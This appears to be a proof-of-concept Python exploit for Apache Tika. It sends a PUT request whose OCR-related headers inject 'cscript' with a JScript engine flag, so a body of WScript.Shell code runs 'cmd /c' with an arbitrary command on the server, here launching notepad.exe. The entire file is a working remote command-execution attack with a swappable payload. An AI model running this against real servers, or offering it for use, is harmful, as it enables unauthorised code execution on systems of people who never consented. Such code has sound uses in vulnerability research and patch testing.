import sys
import requests


url = "http://localhost:9998/meta"


headers = {"X-Tika-OCRTesseractPath": "\"cscript\"",
           "X-Tika-OCRLanguage": "//E:Jscript",
           "Expect": "100-continue",
           "Content-type": "image/jp2",
           "Connection": "close"}

command = "notepad.exe"

jscript='var oShell = WScript.CreateObject("WScript.Shell");var oExec = oShell.Exec(\'cmd /c ' + command + '\');'
r = requests.put(url, headers=headers, data=jscript)
print(r)

                                            

